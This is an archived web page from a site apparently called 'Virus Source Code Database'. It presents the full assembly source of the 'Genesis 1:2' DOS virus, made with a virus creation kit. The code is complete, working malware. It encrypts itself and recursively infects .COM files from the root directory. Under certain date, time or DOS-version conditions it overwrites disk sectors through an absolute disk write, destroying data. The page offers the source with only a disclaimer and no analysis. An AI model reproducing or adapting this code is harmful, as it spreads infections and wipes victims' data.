<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: gen12_asm</title>
<meta name="KEYWORDS" content="gen12.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for gen12.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="g2punish_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/g2punish_asm.php">g2punish_asm</a><br>
<a href="g2rainmn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/g2rainmn_asm.php">g2rainmn_asm</a><br>
<a href="gay-rich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gay-rich_asm.php">gay-rich_asm</a><br>
<a href="gcae-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gcae-gen_asm.php">gcae-gen_asm</a><br>
<a href="gde_pas.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gde_pas.php">gde_pas</a><br>
<a href="geiger_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/geiger_asm.php">geiger_asm</a><br>
<a href="gen12_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gen12_asm.php">gen12_asm</a><br>
<a href="generic__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/generic__asm.php">generic__asm</a><br>
<a href="generic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/generic_asm.php">generic_asm</a><br>
<a href="genius59_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/genius59_asm.php">genius59_asm</a><br>
<a href="getscr_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/getscr_asm.php">getscr_asm</a><br>
<a href="gh_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gh_asm.php">gh_asm</a><br>
<a href="gidra_16_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gidra_16_asm.php">gidra_16_asm</a><br>
<a href="gidra469_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gidra469_asm.php">gidra469_asm</a><br>
<a href="gldbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gldbug_asm.php">gldbug_asm</a><br>
<a href="globe_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/globe_c.php">globe_c</a><br>
<a href="gloom_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gloom_c.php">gloom_c</a><br>
<a href="gobble_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gobble_asm.php">gobble_asm</a><br>
<a href="gold-bu__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gold-bu__asm.php">gold-bu__asm</a><br>
<a href="gold_bug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gold_bug_asm.php">gold_bug_asm</a><br>
<a href="gold-bug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gold-bug_asm.php">gold-bug_asm</a><br>
<a href="goldbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/goldbug_asm.php">goldbug_asm</a><br>
<a href="goldgeld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/goldgeld_asm.php">goldgeld_asm</a><br>
<a href="gomb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gomb_asm.php">gomb_asm</a><br>
<a href="gotcha17_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha17_asm.php">gotcha17_asm</a><br>
<a href="gotcha1__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha1__asm.php">gotcha1__asm</a><br>
<a href="gotcha9e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha9e_asm.php">gotcha9e_asm</a><br>
<a href="gotcha_e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha_e_asm.php">gotcha_e_asm</a><br>
<a href="gotcha-e_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gotcha-e_asm.php">gotcha-e_asm</a><br>
<a href="gothvamp_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gothvamp_asm.php">gothvamp_asm</a><br>
<a href="gpe_gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gpe_gen_asm.php">gpe_gen_asm</a><br>
<a href="gpe-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gpe-gen_asm.php">gpe-gen_asm</a><br>
<a href="greenjok_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/greenjok_asm.php">greenjok_asm</a><br>
<a href="greeting_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/greeting_asm.php">greeting_asm</a><br>
<a href="grither__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/grither__asm.php">grither__asm</a><br>
<a href="grither_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/grither_asm.php">grither_asm</a><br>
<a href="gtcha17_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gtcha17_asm.php">gtcha17_asm</a><br>
<a href="gun_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gun_asm.php">gun_asm</a><br>
<a href="gunther_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/gunther_asm.php">gunther_asm</a><br>
<a href="guppy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/guppy_asm.php">guppy_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

; GEN12.ASM -- Genesis 1:2 Virus
; Created with Nowhere Man's Virus Creation Laboratory v1.00
; Written by Virucidal Maniac

virus_type	equ	0			; Appending Virus
is_encrypted	equ	1			; We're encrypted
tsr_virus	equ	0			; We're not TSR

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

main		proc	near
		db	0E9h,00h,00h		; Near jump (for compatibility)
start:		call	find_offset		; Like a PUSH IP
find_offset:	pop	bp			; BP holds old IP
		sub	bp,offset find_offset	; Adjust for length of host

		call	encrypt_decrypt 	; Decrypt the virus

start_of_code	label	near

		lea	si,[bp + buffer]	; SI points to original start
		mov	di,0100h		; Push 0100h on to stack for
		push	di			; return to main program
		movsw				; Copy the first two bytes
		movsb				; Copy the third byte

		mov	di,bp			; DI points to start of virus

		mov	bp,sp			; BP points to stack
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,02Fh 		; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address on stack

		mov	ah,01Ah 		; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer on stack
		int	021h

		call	get_dos_version
		cmp	ax,0005h		; Did the function return 5?
		jl	strt00			; If less, do effect
		call	get_minute
		or	ax,ax			; Did the function return zero?
		je	strt00			; If equal, do effect
		call	get_year
		cmp	ax,07C9h		; Did the function return 1993?
		je	strt00			; If equal, do effect
		jmp	end00			; Otherwise skip over it
strt00: 	mov	ax,0002h		; First argument is 2
		mov	cx,0007h		; Second argument is 7
		cli				; Disable interrupts (no Ctrl-C)
		cwd				; Clear DX (start with sector 0)
		int	026h			; DOS absolute write interrupt
		sti				; Restore interrupts

end00:		mov	cx,0005h		; Do 5 infections
search_loop:	push	cx			; Save CX
		call	search_files		; Find and infect a file
		pop	cx			; Restore CX
		loop	search_loop		; Repeat until CX is 0

		jmp	end01			; Otherwise skip over it
strt01: 	lea	si,[di + data00]	; SI points to data
		mov	ah,0Eh			; BIOS display char. function
display_loop:	lodsb				; Load the next char. into AL
		or	al,al			; Is the character a null?
		je	disp_strnend		; If it is, exit
		int	010h			; BIOS video interrupt
		jmp	short display_loop	; Do the next character
disp_strnend:

end01:
com_end:	pop	dx			; DX holds original DTA address
		mov	ah,01Ah 		; DOS set DTA function
		int	021h

		mov	sp,bp			; Deallocate local buffer

		xor	ax,ax			;
		mov	bx,ax			;
		mov	cx,ax			;
		mov	dx,ax			; Empty out the registers
		mov	si,ax			;
		mov	di,ax			;
		mov	bp,ax			;

		ret				; Return to original program
main		endp

search_files	proc	near
		push	bp			; Save BP
		mov	bp,sp			; BP points to local buffer
		sub	sp,64			; Allocate 64 bytes on stack

		mov	ah,047h 		; DOS get current dir function
		xor	dl,dl			; DL holds drive # (current)
		lea	si,[bp - 64]		; SI points to 64-byte buffer
		int	021h

		mov	ah,03Bh 		; DOS change directory function
		lea	dx,[di + root]		; DX points to root directory
		int	021h

		call	traverse		; Start the traversal

		mov	ah,03Bh 		; DOS change directory function
		lea	dx,[bp - 64]		; DX points to old directory
		int	021h

		mov	sp,bp			; Restore old stack pointer
		pop	bp			; Restore BP
		ret				; Return to caller

root		db	"\",0			; Root directory
search_files	endp

traverse	proc	near
		push	bp			; Save BP

		mov	ah,02Fh 		; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		mov	ah,01Ah 		; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh 		; DOS find first function
		mov	cx,00010000b		; CX holds search attributes
		lea	dx,[di + all_files]	; DX points to "*.*"
		int	021h
		jc	leave_traverse		; Leave if no files present

check_dir:	cmp	byte ptr [bp - 107],16	; Is the file a directory?
		jne	another_dir		; If not, try again
		cmp	byte ptr [bp - 98],'.'	; Did we get a "." or ".."?
		je	another_dir		;If so, keep going

		mov	ah,03Bh 		; DOS change directory function
		lea	dx,[bp - 98]		; DX points to new directory
		int	021h

		call	traverse		; Recursively call ourself

		pushf				; Save the flags
		mov	ah,03Bh 		; DOS change directory function
		lea	dx,[di + up_dir]	; DX points to parent directory
		int	021h
		popf				; Restore the flags

		jnc	done_searching		; If we infected then exit

another_dir:	mov	ah,04Fh 		; DOS find next function
		int	021h
		jnc	check_dir		; If found check the file

leave_traverse:
		lea	dx,[di + com_mask]	; DX points to "*.COM"
		call	find_files		; Try to infect a file
done_searching: mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah 		; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller

up_dir		db	"..",0			; Parent directory name
all_files	db	"*.*",0 		; Directories to search for
com_mask	db	"*.COM",0		; Mask for all .COM files
traverse	endp

find_files	proc	near
		push	bp			; Save BP

		mov	ah,02Fh 		; DOS get DTA function
		int	021h
		push	bx			; Save old DTA address

		mov	bp,sp			; BP points to local buffer
		sub	sp,128			; Allocate 128 bytes on stack

		push	dx			; Save file mask
		mov	ah,01Ah 		; DOS set DTA function
		lea	dx,[bp - 128]		; DX points to buffer
		int	021h

		mov	ah,04Eh 		; DOS find first file function
		mov	cx,00100111b		; CX holds all file attributes
		pop	dx			; Restore file mask
find_a_file:	int	021h
		jc	done_finding		; Exit if no files found
		call	infect_file		; Infect the file!
		jnc	done_finding		; Exit if no error
		mov	ah,04Fh 		; DOS find next file function
		jmp	short find_a_file	; Try finding another file

done_finding:	mov	sp,bp			; Restore old stack frame
		mov	ah,01Ah 		; DOS set DTA function
		pop	dx			; Retrieve old DTA address
		int	021h

		pop	bp			; Restore BP
		ret				; Return to caller
find_files	endp

infect_file	proc	near
		mov	ah,02Fh 		; DOS get DTA address function
		int	021h
		mov	si,bx			; SI points to the DTA

		mov	byte ptr [di + set_carry],0  ; Assume we'll fail

		cmp	word ptr [si + 01Ah],(65279 - (finish - start))
		jbe	size_ok 		; If it's small enough continue
		jmp	infection_done		; Otherwise exit

size_ok:	mov	ax,03D00h		; DOS open file function, r/o
		lea	dx,[si + 01Eh]		; DX points to file name
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,03Fh 		; DOS read from file function
		mov	cx,3			; CX holds bytes to read (3)
		lea	dx,[di + buffer]	; DX points to buffer
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

		xchg	dx,ax			; Faster than a PUSH AX
		mov	ah,03Eh 		; DOS close file function
		int	021h
		xchg	dx,ax			; Faster than a POP AX

		sub	ax,finish - start + 3	; Adjust AX for a valid jump
		cmp	word ptr [di + buffer + 1],ax  ; Is there a JMP yet?
		je	infection_done		; If equal then exit
		mov	byte ptr [di + set_carry],1  ; Success -- the file is OK
		add	ax,finish - start	; Re-adjust to make the jump
		mov	word ptr [di + new_jump + 1],ax  ; Construct jump

		mov	ax,04301h		; DOS set file attrib. function
		xor	cx,cx			; Clear all attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

		mov	ax,03D02h		; DOS open file function, r/w
		int	021h
		xchg	bx,ax			; BX holds file handle

		mov	ah,040h 		; DOS write to file function
		mov	cx,3			; CX holds bytes to write (3)
		lea	dx,[di + new_jump]	; DX points to the jump we made
		int	021h

		mov	ax,04202h		; DOS file seek function, EOF
		cwd				; Zero DX _ Zero bytes from end
		mov	cx,dx			; Zero CX /
		int	021h

		push	si			; Save SI through call
		call	encrypt_code		; Write an encrypted copy
		pop	si			; Restore SI

		mov	ax,05701h		; DOS set file time function
		mov	cx,[si + 016h]		; CX holds old file time
		mov	dx,[si + 018h]		; DX holds old file date
		int	021h

		mov	ah,03Eh 		; DOS close file function
		int	021h

		mov	ax,04301h		; DOS set file attrib. function
		xor	ch,ch			; Clear CH for file attribute
		mov	cl,[si + 015h]		; CX holds file's old attributes
		lea	dx,[si + 01Eh]		; DX points to victim's name
		int	021h

infection_done: cmp	byte ptr [di + set_carry],1  ; Set carry flag if failed
		ret				; Return to caller

set_carry	db	?			; Set-carry-on-exit flag
buffer		db	090h,0CDh,020h		; Buffer to hold old three bytes
new_jump	db	0E9h,?,?		; New jump to virus
infect_file	endp


get_dos_version proc	near
		mov	ah,030h 		; DOS get DOS version function
		int	021h
		mov	bx,ax			; Save return value in BX
		xor	bl,bl			; Clear DOS major version in BX
		xchg	bh,bl			; Place 0 in BH, minor in BL
		cbw				; Sign-extend AL into AX
		mov	cl,100			; CL holds multiplier
		mul	cl			; Multiply AL by 100
		add	ax,bx			; Add back the minor version
		ret				; Return to caller
get_dos_version endp

get_minute	proc	near
		mov	ah,02Ch 		; DOS get time function
		int	021h
		mov	al,cl			; Copy minute into AL
		cbw				; Sign-extend AL into AX
		ret				; Return to caller
get_minute	endp

get_year	proc	near
		mov	ah,02Ah 		; DOS get date function
		int	021h
		xchg	cx,ax			; Transfer the year into AX
		ret				; Return to caller
get_year	endp

data00	      db  "Genesis 1:2",13,10
	      db  "    And the earth was without form and void...",13,10
	      db  13,10
	      db  "            Now...So is your hard disk.",13,10
	      db  13,10
	      db  "                -Virucidal Maniac",13,10

vcl_marker	db	"[VCL]",0		; VCL creation marker

encrypt_code	proc	near
		push	bp			; Save BP
		mov	bp,di			; Use BP as pointer to code
		lea	si,[bp + encrypt_decrypt]; SI points to cipher routine

		xor	ah,ah			; BIOS get time function
		int	01Ah
		mov	word ptr [si + 9],dx	; Low word of timer is new key

		xor	byte ptr [si + 1],8	;
		xor	byte ptr [si + 8],1	; Change all SIs to DIs
		xor	word ptr [si + 11],0101h; (and vice-versa)

		lea	di,[bp + finish]	; Copy routine into heap
		mov	cx,finish - encrypt_decrypt - 1  ; All but final RET
		push	si			; Save SI for later
		push	cx			; Save CX for later
	rep	movsb				; Copy the bytes

		lea	si,[bp + write_stuff]	; SI points to write stuff
		mov	cx,5			; CX holds length of write
	rep	movsb				; Copy the bytes

		pop	cx			; Restore CX
		pop	si			; Restore SI
		inc	cx			; Copy the RET also this time
	rep	movsb				; Copy the routine again

		mov	ah,040h 		; DOS write to file function
		lea	dx,[bp + start] 	; DX points to virus

		lea	si,[bp + finish]	; SI points to routine
		call	si			; Encrypt/write/decrypt

		mov	di,bp			; DI points to virus again
		pop	bp			; Restore BP
		ret				; Return to caller

write_stuff:	mov	cx,finish - start	; Length of code
		int	021h
encrypt_code	endp

end_of_code	label	near

encrypt_decrypt proc	near
		lea	si,[bp + start_of_code] ; SI points to code to decrypt
		mov	cx,(end_of_code - start_of_code) / 2 ; CX holds length
xor_loop:	db	081h,034h,00h,00h	; XOR a word by the key
		inc	si			; Do the next word
		inc	si			;
		loop	xor_loop		; Loop until we're through
		ret				; Return to caller
encrypt_decrypt endp
finish		label	near

code		ends
		end	main

</textarea></td></tr></table></body></html>
